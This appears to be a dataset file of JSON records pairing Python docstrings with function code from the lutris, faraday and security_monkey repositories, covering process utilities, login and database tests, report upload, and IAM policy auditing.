{"docstring": "\"\"\"Return command line used to run the process `pid`.\"\"\"\n", "func_signal": "def cmdline(self):\n", "code": "cmdline_path = \"/proc/{}/cmdline\".format(self.pid)\nwith open(cmdline_path) as cmdline_file:\n    _cmdline = cmdline_file.read().replace(\"\\x00\", \" \")\nreturn _cmdline", "path": "lutris/lutris/util/process.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"One character from the string \"RSDZTW\" where R is running, S is\nsleeping in an interruptible wait, D is waiting in uninterruptible disk\nsleep, Z is zombie, T is traced or stopped (on a signal), and W is\npaging.\n\"\"\"\n", "func_signal": "def state(self):\n", "code": "_stat = self.get_stat()\nif _stat:\n    return _stat[0]\nreturn None", "path": "lutris/lutris/util/process.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Return a list of thread ids opened by process.\"\"\"\n", "func_signal": "def get_thread_ids(self):\n", "code": "basedir = \"/proc/{}/task/\".format(self.pid)\nif os.path.isdir(basedir):\n    try:\n        return os.listdir(basedir)\n    except FileNotFoundError:\n        return []\nelse:\n    return []", "path": "lutris/lutris/util/process.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Removes all subkeys from a key\"\"\"\n", "func_signal": "def clear_key(self, path):\n", "code": "key = self.keys.get(path)\nif not key:\n    return\nkey.subkeys.clear()", "path": "lutris/lutris/util/wine/registry.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Return the Wine prefix path (where the .reg files are located)\"\"\"\n", "func_signal": "def prefix_path(self):\n", "code": "if self.reg_filename:\n    return os.path.dirname(self.reg_filename)\nreturn None", "path": "lutris/lutris/util/wine/registry.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\" used by write_json \"\"\"\n", "func_signal": "def selective_merge(base_obj, delta_obj):\n", "code": "if not isinstance(base_obj, dict):\n    return delta_obj\ncommon_keys = set(base_obj).intersection(delta_obj)\nnew_keys = set(delta_obj).difference(common_keys)\nfor k in common_keys:\n    base_obj[k] = selective_merge(base_obj[k], delta_obj[k])\nfor k in new_keys:\n    base_obj[k] = delta_obj[k]\nreturn base_obj", "path": "lutris/lutris/util/__init__.py", "commit_date": "2017-09-03 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\" Check for correct bios files \"\"\"\n", "func_signal": "def find_good_bioses(self, bios_path):\n", "code": "good_bios = {}\nfor filename in os.listdir(bios_path):\n    real_hash = system.get_md5_hash(os.path.join(bios_path, filename))\n    for bios_file, checksum in self.bios_checksums.items():\n        if real_hash == checksum:\n            logging.debug(\"%s Checksum : OK\", filename)\n            good_bios[bios_file] = filename\nreturn good_bios", "path": "lutris/lutris/runners/atari800.py", "commit_date": "2020-11-30 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"\n    Use of a valid auth token\n\"\"\"\n\n", "func_signal": "def test_null_caracters(self, test_client, session):\n", "code": "alice = factories.UserFactory.create(\n        active=True,\n        username='asdasd',\n        password=hash_password('asdasd'),\n        role='pentester')\nsession.add(alice)\nsession.commit()\n\nws = factories.WorkspaceFactory.create(name='wonderland')\nsession.add(ws)\nsession.commit()\n\nlogin_payload = {\n    'email': \"\\x00asd\\00asd\\0\",\n    'password': \"\\x00asd\\00asd\\0\",\n}\nres = test_client.post('/login', data=login_payload)\n# import ipdb; ipdb.set_trace()\nassert res.status_code == 200\nassert 'authentication_token' in res.json['response']['user']\n\nheaders = {'Authentication-Token': res.json['response']['user']['authentication_token']}\n\nws = test_client.get('/v2/ws/wonderland/', headers=headers)\nassert ws.status_code == 200", "path": "faraday/tests/test_api_login.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "# rollback - everything that happened with the\n# Session above (including calls to commit())\n# is rolled back.\n# be careful with this!!!!!\n", "func_signal": "def teardown():\n", "code": "transaction.rollback()\nconnection.close()\nsession.remove()", "path": "faraday/tests/conftest.py", "commit_date": "2020-10-28 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"\n    Use of a valid auth token\n\"\"\"\n\n", "func_signal": "def test_case_ws_with_valid_authentication_token(self, test_client, session):\n", "code": "alice = factories.UserFactory.create(\n        active=True,\n        username='alice',\n        password=hash_password('passguord'),\n        role='pentester')\nsession.add(alice)\nsession.commit()\n\nws = factories.WorkspaceFactory.create(name='wonderland')\nsession.add(ws)\nsession.commit()\n\nlogin_payload = {\n    'email': 'alice',\n    'password': 'passguord',\n}\nres = test_client.post('/login', data=login_payload)\nassert res.status_code == 200\nassert 'authentication_token' in res.json['response']['user']\n\nheaders = {'Authentication-Token': res.json['response']['user']['authentication_token']}\n\nws = test_client.get('/v2/ws/wonderland/', headers=headers)\nassert ws.status_code == 200", "path": "faraday/tests/test_api_login.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "# Since we don't have jet a model for workspace we\n# retrieve the name from the connection string\n", "func_signal": "def new_object_event(mapper, connection, instance):\n", "code": "try:\n    name = instance.ip\nexcept AttributeError:\n    name = instance.name\nmsg = {\n    'id': instance.id,\n    'action': 'CREATE',\n    'type': instance.__class__.__name__,\n    'name': name,\n    'workspace': instance.workspace.name\n}\nchanges_queue.put(msg)", "path": "faraday/faraday/server/events.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"\n    When the remember me option is true, flask stores a remember_token\n\"\"\"\n", "func_signal": "def test_login_remember_me(self, test_client, session):\n", "code": "test_client.cookie_jar.clear()\nsusan = factories.UserFactory.create(\n        active=True,\n        username='susan',\n        password=hash_password('pepito'),\n        role='pentester')\nsession.add(susan)\nsession.commit()\n\nlogin_payload = {\n    'email': 'susan',\n    'password': 'pepito',\n    'remember': True\n}\nres = test_client.post('/login', data=login_payload)\nassert res.status_code == 200\ncookies = [cookie.name for cookie in test_client.cookie_jar]\nassert \"remember_token\" in cookies", "path": "faraday/tests/test_api_login.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"\n    Use of an invalid auth token\n\"\"\"\n# clean cookies make sure test_client has no session\n", "func_signal": "def test_case_ws_with_invalid_authentication_token(self, test_client, session):\n", "code": "test_client.cookie_jar.clear()\nsecret_key = app.config['SECRET_KEY']\nalice = factories.UserFactory.create(\n        active=True,\n        username='alice',\n        password=hash_password('passguord'),\n        role='pentester')\nsession.add(alice)\nsession.commit()\n\nws = factories.WorkspaceFactory.create(name='wonderland')\nsession.add(ws)\nsession.commit()\n\nserializer = TimedJSONWebSignatureSerializer(app.config['SECRET_KEY'], expires_in=500, salt=\"token\")\ntoken = serializer.dumps({ 'user_id': alice.id})\n\nheaders = {'Authorization': b'Token ' + token}\n\nws = test_client.get('/v2/ws/wonderland/', headers=headers)\nassert ws.status_code == 401", "path": "faraday/tests/test_api_login.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"\nLimit results from a query based on pagination parameters\n\"\"\"\n", "func_signal": "def paginate(query, page, page_size):\n", "code": "if not (page >= 0 and page_size >= 0):\n    raise Exception(\"invalid values for pagination (page: %d, page_size: %d)\" % (page, page_size))\nreturn query.limit(page_size).offset(page * page_size)", "path": "faraday/faraday/server/utils/database.py", "commit_date": "2020-10-28 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"\n---\npost:\n  tags: [\"Workspace\", \"File\"]\n  description: Upload a report file to create data within the given workspace\n  responses:\n    201:\n      description: Created\n    400:\n      description: Bad request\n    403:\n      description: Forbidden\ntags: [\"Workspace\", \"File\"]\nresponses:\n  200:\n    description: Ok\n\"\"\"\n", "func_signal": "def file_upload(workspace=None):\n", "code": "logger.info(\"Importing new plugin report in server...\")\n# Authorization code copy-pasted from server/api/base.py\nws = Workspace.query.filter_by(name=workspace).first()\nif not ws or not ws.active:\n    # Don't raise a 403 to prevent workspace name enumeration\n    abort(404, f\"Workspace disabled: {workspace}\")\n\nif 'file' not in request.files:\n    abort(400)\n\ntry:\n    validate_csrf(request.form.get('csrf_token'))\nexcept ValidationError:\n    abort(403)\n\nreport_file = request.files['file']\n\nif report_file:\n\n    chars = string.ascii_uppercase + string.digits\n    random_prefix = ''.join(random.choice(chars) for x in range(12)) # nosec\n    raw_report_filename = f'{random_prefix}_{secure_filename(report_file.filename)}'\n\n    try:\n        file_path = CONST_FARADAY_HOME_PATH / 'uploaded_reports' \\\n                    / raw_report_filename\n        with file_path.open('wb') as output:\n            output.write(report_file.read())\n    except AttributeError:\n        logger.warning(\n            \"Upload reports in WEB-UI not configurated, run Faraday client and try again...\")\n        abort(make_response(jsonify(message=\"Upload reports not configurated: Run faraday client and start Faraday server again\"), 500))\n    else:\n        logger.info(f\"Get plugin for file: {file_path}\")\n        plugin = report_analyzer.get_plugin(file_path)\n        if not plugin:\n            logger.info(\"Could not get plugin for file\")\n            abort(make_response(jsonify(message=\"Invalid report file\"), 400))\n        else:\n            logger.info(\n                f\"Plugin for file: {file_path} Plugin: {plugin.id}\"\n            )\n            workspace_instance = Workspace.query.filter_by(\n                name=workspace).one()\n            command = Command()\n            command.workspace = workspace_instance\n            command.start_date = datetime.now()\n            command.import_source = 'report'\n            # The data will be updated in the bulk_create function\n            command.tool = \"In progress\"\n            command.command = \"In progress\"\n\n            db.session.add(command)\n            db.session.commit()\n\n            REPORTS_QUEUE.put(\n                (\n                    workspace_instance.name,\n                    command.id,\n                    file_path,\n                    plugin.id,\n                    flask.g.user.id\n                )\n            )\n            return make_response(\n                jsonify(message=\"ok\", command_id=command.id),\n                200\n            )\nelse:\n    abort(make_response(jsonify(message=\"Missing report file\"), 400))", "path": "faraday/faraday/server/api/modules/upload_reports.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "# this could be better with python3 (like in the comment before the function\n# definition)\n", "func_signal": "def assert_deletes(self, *objs, **kwargs):\n", "code": "should_delete = kwargs.get('should_delete', True)\nassert all(obj.id is not None for obj in objs)\nids = [(obj.__table__, obj.id) for obj in objs]\nyield\nself.session.commit()\nfor (table, id_) in ids:\n    if should_delete:\n        expected_count = 0\n    else:\n        expected_count = 1\n    assert self.session.query(table).filter(\n        table.columns['id'] == id_).count() == expected_count", "path": "faraday/tests/models/test_cascades.py", "commit_date": "2020-05-06 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "# print 'user', id(session), session\n", "func_signal": "def user(app, database, session):\n", "code": "return create_user(app, session, 'test', 'user@test.com', 'password',\n                   is_ldap=False)", "path": "faraday/tests/conftest.py", "commit_date": "2020-10-28 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "# It might be  required to do a cascade delete to correctly the\n# vulnerability table\n", "func_signal": "def reset_db_all():\n", "code": "for table in ('vulnerability', 'vulnerability_template', 'comment',\n              'faraday_user'):\n    try:\n        db.engine.execute(f'DROP TABLE {table} CASCADE')\n    except Exception as ex:\n        print(ex)\ndb.drop_all()\n\n# db.create_all()\n# Ugly hack to create tables and also setting alembic revision\nconn_string = faraday.server.config.database.connection_string\nInitDB()._create_tables(conn_string)", "path": "faraday/faraday/server/commands/reset_db.py", "commit_date": "2020-10-28 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"\n    When the remember me option is false, flask dont stores a remember_token\n\"\"\"\n\n", "func_signal": "def test_login_not_remember_me(self, test_client, session):\n", "code": "test_client.cookie_jar.clear()\nsusan = factories.UserFactory.create(\n        active=True,\n        username='susan',\n        password=hash_password('pepito'),\n        role='pentester')\nsession.add(susan)\nsession.commit()\nlogin_payload = {\n    'email': 'susan',\n    'password': 'pepito',\n    'remember': False\n}\nres = test_client.post('/login', data=login_payload)\nassert res.status_code == 200\ncookies = [cookie.name for cookie in test_client.cookie_jar]\nassert \"remember_token\" not in cookies", "path": "faraday/tests/test_api_login.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"\nGet a query row's count. This implementation performs significantly better\nthan messaging a query's count method.\n\"\"\"\n", "func_signal": "def get_count(query, count_col=None):\n", "code": "if count_col is None:\n    count_filter = [func.count()]\nelse:\n    count_filter = [func.count(distinct(count_col))]\n\ncount_q = query.statement.with_only_columns(count_filter).\\\n          order_by(None).group_by(None)\ncount = query.session.execute(count_q).scalar()\n\nreturn count", "path": "faraday/faraday/server/utils/database.py", "commit_date": "2020-10-28 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "# currently for tests using sqlite and memory have problem while using transactions\n# we need to review sqlite configuraitons for persistence using PRAGMA.\n", "func_signal": "def pytest_addoption(parser):\n", "code": "parser.addoption('--connection-string', default=f'sqlite:////{TEMPORATY_SQLITE.name}',\n                 help=\"Database connection string. Defaults to in-memory \"\n                 \"sqlite if not specified:\")\nparser.addoption('--ignore-nplusone', action='store_true',\n                 help=\"Globally ignore nplusone errors\")\nparser.addoption(\"--with-hypothesis\", action=\"store_true\",\n                 dest=\"use_hypothesis\", default=False,\n                 help=\"Run property based tests\")", "path": "faraday/tests/conftest.py", "commit_date": "2020-10-28 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"\n    When the remember me option is missing, flask dont stores a remember_token\n\"\"\"\n\n", "func_signal": "def test_login_without_remember_me(self, test_client, session):\n", "code": "test_client.cookie_jar.clear()\nsusan = factories.UserFactory.create(\n        active=True,\n        username='susan',\n        password=hash_password('pepito'),\n        role='pentester')\nsession.add(susan)\nsession.commit()\nlogin_payload = {\n    'email': 'susan',\n    'password': 'pepito'\n}\nres = test_client.post('/login', data=login_payload)\nassert res.status_code == 200\ncookies = [cookie.name for cookie in test_client.cookie_jar]\nassert \"remember_token\" not in cookies", "path": "faraday/tests/test_api_login.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"\nBuild the filter for a SQL query from a free-text-search term or based on individual\nfilters applied to labeled columns declared in field_to_col_map.\n\nFTS implementation is rudimentary since it applies the same LIKE filter for all\ndeclared columns in field_to_col_map, where the individual search terms stated\nin field_filter take precedence.\n\"\"\"\n# Raise an error in case an asked column to filter by is not mapped\n", "func_signal": "def apply_search_filter(query, field_to_col_map, free_text_search=None, field_filter={}, strict_filter=[]):\n", "code": "if any(map(lambda attr: attr not in field_to_col_map, field_filter)):\n    raise Exception('invalid field to filter')\n\nfts_sql_filter = None\ndfs_sql_filter = None\n\n# Iterate over every searchable field declared in the mapping\n# to then apply a filter on the query if required\nfor attribute in field_to_col_map:\n    is_direct_filter_search = attribute in field_filter\n    is_free_text_search = not is_direct_filter_search and free_text_search\n\n    # Add wildcards to both ends of a search term\n    if is_direct_filter_search:\n        like_str = u'%' + field_filter.get(attribute) + u'%'\n    elif is_free_text_search:\n        like_str = u'%' + free_text_search + u'%'\n    else:\n        continue\n\n    search_term_sql_filter = None\n    for column in field_to_col_map.get(attribute):\n        # Labels are expressed as strings in the mapping,\n        # currently we are not supporting searches on this\n        # kind of fields since they are usually referred to\n        # query built values (like counts)\n        if isinstance(column, str):\n            continue\n\n        # Prepare a SQL search term according to the columns type.\n        # As default we treat every column as an string and therefore\n        # we use 'like' to search through them.\n        if is_direct_filter_search and isinstance(column.type, Boolean):\n            field_search_term = field_filter.get(attribute).lower()\n            search_term = prepare_boolean_filter(column, field_search_term)\n            # Ignore filter for this field if the values weren't expected\n            if search_term is None:\n                continue\n        else:\n            # Strict filtering can be applied for fields. FTS will\n            # ignore this list since its purpose is clearly to\n            # match anything it can find.\n            if is_direct_filter_search and attribute in strict_filter:\n                search_term = column.op('=')(field_filter.get(attribute))\n            else:\n                search_term = column.like(like_str)\n\n        search_term_sql_filter = concat_or_search_term(search_term_sql_filter, search_term)\n\n    # Concatenate multiple search terms on its proper filter\n    if is_direct_filter_search:\n        dfs_sql_filter = concat_and_search_term(dfs_sql_filter, search_term_sql_filter)\n    elif is_free_text_search:\n        fts_sql_filter = concat_or_search_term(fts_sql_filter, search_term_sql_filter)\n\nsql_filter = concat_and_search_term(fts_sql_filter, dfs_sql_filter)\nreturn query.filter(sql_filter) if sql_filter is not None else query", "path": "faraday/faraday/server/utils/database.py", "commit_date": "2020-10-28 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"Use this fixture if the function being tested does a session\nrollback.\n\nSee http://docs.sqlalchemy.org/en/latest/orm/session_transaction.html#joining-a-session-into-an-external-transaction-such-as-for-test-suites\nfor further information\n\"\"\"\n", "func_signal": "def session(database, request):\n", "code": "connection = database.engine.connect()\ntransaction = connection.begin()\n\noptions = {\"bind\": connection, 'binds': {}}\nsession = db.create_scoped_session(options=options)\n\n# start the session in a SAVEPOINT...\nsession.begin_nested()\n\n# then each time that SAVEPOINT ends, reopen it\n@event.listens_for(session, \"after_transaction_end\")\ndef restart_savepoint(session, transaction):\n    if transaction.nested and not transaction._parent.nested:\n\n        # ensure that state is expired the way\n        # session.commit() at the top level normally does\n        # (optional step)\n        session.expire_all()\n\n        session.begin_nested()\n\ndatabase.session = session\ndb.session = session\n\nfor factory in enabled_factories:\n    factory._meta.sqlalchemy_session = session\n\ndef teardown():\n    # rollback - everything that happened with the\n    # Session above (including calls to commit())\n    # is rolled back.\n    # be careful with this!!!!!\n    transaction.rollback()\n    connection.close()\n    session.remove()\n\nrequest.addfinalizer(teardown)\nreturn session", "path": "faraday/tests/conftest.py", "commit_date": "2020-10-28 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"Session-wide test database.\"\"\"\n\n", "func_signal": "def database(app, request):\n", "code": "def teardown():\n    try:\n        db.engine.execute('DROP TABLE vulnerability CASCADE')\n    except Exception:\n        pass\n    try:\n        db.engine.execute('DROP TABLE vulnerability_template CASCADE')\n    except Exception:\n        pass\n    db.drop_all()\n\n# Disable check_vulnerability_host_service_source_code constraint because\n# it doesn't work in sqlite\nvuln_constraints = db.metadata.tables['vulnerability'].constraints\nvuln_constraints.remove(next(\n    constraint for constraint in vuln_constraints\n    if constraint.name == 'check_vulnerability_host_service_source_code'))\n\ndb.app = app\ndb.create_all()\n\nrequest.addfinalizer(teardown)\nreturn db", "path": "faraday/tests/conftest.py", "commit_date": "2020-10-28 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "# clean cookies make sure test_client has no session\n", "func_signal": "def test_cant_retrieve_token_unauthenticated(self, test_client):\n", "code": "test_client.cookie_jar.clear()\nres = test_client.get('/v2/token/')\n\nassert res.status_code == 401", "path": "faraday/tests/test_api_login.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"\n    When the user case does not match the one in database,\n    the form is valid but no record was found in the database.\n\"\"\"\n\n", "func_signal": "def test_case_bug_with_username(self, test_client, session):\n", "code": "susan = factories.UserFactory.create(\n        active=True,\n        username='Susan',\n        password=hash_password('pepito'),\n        role='pentester')\nsession.add(susan)\nsession.commit()\n# we use lower case username, but in db is Capitalized\nlogin_payload = {\n    'email': 'susan',\n    'password': 'pepito',\n}\nres = test_client.post('/login', data=login_payload)\nassert res.status_code == 200\nassert 'authentication_token' in res.json['response']['user']", "path": "faraday/tests/test_api_login.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "infobyte/faraday", "stars": 4513, "license": "gpl-3.0", "language": "python", "size": 215282}
{"docstring": "\"\"\"\nalert when an IAM Object has a policy allowing 'iam:*'.\n\"\"\"\n", "func_signal": "def check_iam_star_privileges(self, item):\n", "code": "if not is_aws_managed_policy(item) or (is_aws_managed_policy(item) and has_attached_resources(item)):\n    super(ManagedPolicyAuditor, self).check_iam_star_privileges(item)", "path": "security_monkey/security_monkey/auditors/iam/managed_policy.py", "commit_date": "2018-05-18 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"\nalert when an IAM Object has a policy containing 'NotAction'.\nNotAction combined with an \"Effect\": \"Allow\" often provides more privilege\nthan is desired.\n\"\"\"\n", "func_signal": "def check_notaction(self, item):\n", "code": "if not is_aws_managed_policy(item) or (is_aws_managed_policy(item) and has_attached_resources(item)):\n    super(ManagedPolicyAuditor, self).check_notaction(item)", "path": "security_monkey/security_monkey/auditors/iam/managed_policy.py", "commit_date": "2018-05-18 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"\n    .. http:post:: /api/1/account/\n\n    Create a new account.\n\n    **Example Request**:\n\n    .. sourcecode:: http\n\n        POST /api/1/account/ HTTP/1.1\n        Host: example.com\n        Accept: application/json\n\n        {\n            'name': 'new_account'\n            'identifier': '0123456789',\n            'notes': 'this account is for ...',\n            'active': true,\n            'third_party': false\n            'account_type': 'AWS'\n        }\n\n    **Example Response**:\n\n    .. sourcecode:: http\n\n        HTTP/1.1 201 Created\n        Vary: Accept\n        Content-Type: application/json\n\n        {\n            'name': 'new_account'\n            'identifier': '0123456789',\n            'notes': 'this account is for ...',\n            'active': true,\n            'third_party': false\n            'account_type': 'AWS'\n            ''\n        }\n\n    :statuscode 201: created\n    :statuscode 401: Authentication Error. Please Login.\n\"\"\"\n\n", "func_signal": "def post(self):\n", "code": "args = json.loads(request.json)\naccount_type = args['account_type']\nname = args['name']\nidentifier = args['identifier']\nnotes = args['notes']\nactive = args['active']\nthird_party = args['third_party']\ncustom_fields = args['custom_fields']\n\nfrom security_monkey.account_manager import account_registry\naccount_manager = account_registry.get(account_type)()\naccount = account_manager.create(account_type, name, active, third_party,\n            notes, identifier, custom_fields=custom_fields)\n\nmarshaled_account = marshal(account.__dict__, ACCOUNT_FIELDS)\nmarshaled_account['auth'] = self.auth_dict\nreturn marshaled_account, 200", "path": "security_monkey/security_monkey/views/account.py", "commit_date": "2020-02-21 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"\n    .. http:put:: /api/1/auditorsettings/<int ID>\n\n    Update an AuditorSetting\n\n    **Example Request**:\n\n    .. sourcecode:: http\n\n        PUT /api/1/auditorsettings/1 HTTP/1.1\n        Host: example.com\n        Accept: application/json, text/javascript\n\n        {\n            account: \"aws-account-name\",\n            disabled: false,\n            id: 1,\n            issue: \"User with password login.\",\n            technology: \"iamuser\"\n        }\n\n\n    **Example Response**:\n\n    .. sourcecode:: http\n\n        HTTP/1.1 200 OK\n        Content-Type: application/json\n\n    :statuscode 200: no error\n    :statuscode 401: Authentication failure. Please login.\n\"\"\"\n\n", "func_signal": "def put(self, as_id):\n", "code": "self.reqparse.add_argument('disabled', type=bool, required=True, location='json')\nargs = self.reqparse.parse_args()\ndisabled = args.pop('disabled', None)\nresults = AuditorSettings.query.get(as_id)\nresults.disabled = disabled\ndb.session.add(results)\ndb.session.commit()\nreturn 200", "path": "security_monkey/security_monkey/views/auditor_settings.py", "commit_date": "2020-02-21 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"\n    .. http:get:: /api/1/accounts\n\n    Get a list of Accounts matching the given criteria\n\n    **Example Request**:\n\n    .. sourcecode:: http\n\n        GET /api/1/accounts HTTP/1.1\n        Host: example.com\n        Accept: application/json, text/javascript\n\n    **Example Response**:\n\n    .. sourcecode:: http\n\n        HTTP/1.1 200 OK\n        Vary: Accept\n        Content-Type: application/json\n\n        {\n            count: 1,\n            items: [\n                {\n                    third_party: false,\n                    name: \"example_name\",\n                    notes: null,\n                    role_name: null,\n                    identifier: \"111111111111\",\n                    active: true,\n                    id: 1,\n                    s3_name: \"example_name\"\n                },\n            ],\n            total: 1,\n            page: 1,\n            auth: {\n                authenticated: true,\n                user: \"user@example.com\"\n            }\n        }\n\n    :statuscode 200: no error\n    :statuscode 401: Authentication failure. Please login.\n\"\"\"\n\n", "func_signal": "def get(self):\n", "code": "self.reqparse.add_argument('count', type=int, default=30, location='args')\nself.reqparse.add_argument('page', type=int, default=1, location='args')\nself.reqparse.add_argument('order_by', type=str, default=None, location='args')\nself.reqparse.add_argument('order_dir', type=str, default='desc', location='args')\nself.reqparse.add_argument('active', type=str, default=None, location='args')\nself.reqparse.add_argument('third_party', type=str, default=None, location='args')\n\nargs = self.reqparse.parse_args()\npage = args.pop('page', None)\ncount = args.pop('count', None)\norder_by = args.pop('order_by', None)\norder_dir = args.pop('order_dir', None)\nfor k, v in list(args.items()):\n    if not v:\n        del args[k]\n\nquery = Account.query\nif 'active' in args:\n    active = args['active'].lower() == \"true\"\n    query = query.filter(Account.active == active)\nif 'third_party' in args:\n    third_party = args['third_party'].lower() == \"true\"\n    query = query.filter(Account.third_party == third_party)\n\nif order_by and hasattr(Account, order_by):\n    if order_dir.lower() == 'asc':\n        if order_by == 'account_type':\n            query = query.join(Account.account_type).order_by(getattr(AccountType, 'name').asc())\n        else:\n            query = query.order_by(getattr(Account, order_by).asc())\n    else:\n        if order_by == 'account_type':\n            query = query.join(Account.account_type).order_by(getattr(AccountType, 'name').desc())\n        else:\n            query = query.order_by(getattr(Account, order_by).desc())\nelse:\n    query = query.order_by(Account.id)\n\nresult = query.paginate(page, count, error_out=False)\n\nitems = []\nfor account in result.items:\n    account_marshaled = marshal(account.__dict__, ACCOUNT_FIELDS)\n    account_marshaled = dict(\n        list(account_marshaled.items()) +\n        list({'account_type': account.account_type.name}.items())\n    )\n\n    items.append(account_marshaled)\n\nmarshaled_dict = {\n    'total': result.total,\n    'count': len(items),\n    'page': result.page,\n    'items': items,\n    'auth': self.auth_dict\n}\n\nreturn marshaled_dict, 200", "path": "security_monkey/security_monkey/views/account.py", "commit_date": "2020-02-21 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "# Add (RBAC, app) to flask extensions.\n# Add hook to authenticate permission before request.\n\n", "func_signal": "def init_app(self, app):\n", "code": "if not hasattr(app, 'extensions'):\n    app.extensions = {}\napp.extensions['rbac'] = _RBACState(self, app)\n\nself.acl.allow(anonymous, 'GET', app.view_functions['static'].__name__)\napp.before_first_request(self._setup_acl)\napp.before_request(self._authenticate)", "path": "security_monkey/security_monkey/auth/modules.py", "commit_date": "2018-03-03 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"Exempt a view function from being checked permission\n\n:param view_func: The view function exempt from checking.\n\"\"\"\n", "func_signal": "def exempt(self, view_func):\n", "code": "if not view_func in self._exempt:\n    self._exempt.append(view_func)", "path": "security_monkey/security_monkey/auth/modules.py", "commit_date": "2018-03-03 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
{"docstring": "\"\"\"This revision is going to expand the hash database fields from `varchar(32)` to `varchar(64)`. Due to the usage of DeepHash.\nNote: This is going to result in all change items getting re-updated as the hashes are going to be different.\n\"\"\"\n", "func_signal": "def upgrade():\n", "code": "op.alter_column('item', 'latest_revision_complete_hash', type_=sa.VARCHAR(64), existing_type=sa.VARCHAR(length=32), existing_nullable=True)\nop.alter_column('item', 'latest_revision_durable_hash', type_=sa.VARCHAR(64), existing_type=sa.VARCHAR(length=32), existing_nullable=True)", "path": "security_monkey/migrations/versions/15e39d43395f_.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "Netflix/security_monkey", "stars": 4349, "license": "apache-2.0", "language": "python", "size": 14392}
